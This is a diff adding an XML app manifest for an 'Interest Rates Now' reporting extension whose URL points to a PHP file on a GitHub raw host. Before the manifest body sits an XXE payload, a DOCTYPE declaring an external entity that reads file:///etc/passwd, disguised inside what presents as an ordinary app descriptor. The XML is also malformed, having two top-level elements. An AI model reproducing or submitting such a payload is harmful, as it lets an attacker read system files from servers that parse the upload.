@@ -1,0 +1,15 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<app>
+     <id>gj8dl19d0</id>
+     <name>Interest Rates Now</name>
+     <provider>Interest Rater</provider>
+     <description>A tool to see the current interest rate</description>
+     <extensionpoint>
+          <location>REPORTING_VIEW</location>
+          <label>Interest Rates</label>
+          <url>https://raw.githubusercontent.com/paco-esmund/testing/refs/heads/main/test.php</url>
+     </extensionpoint>
+</app>
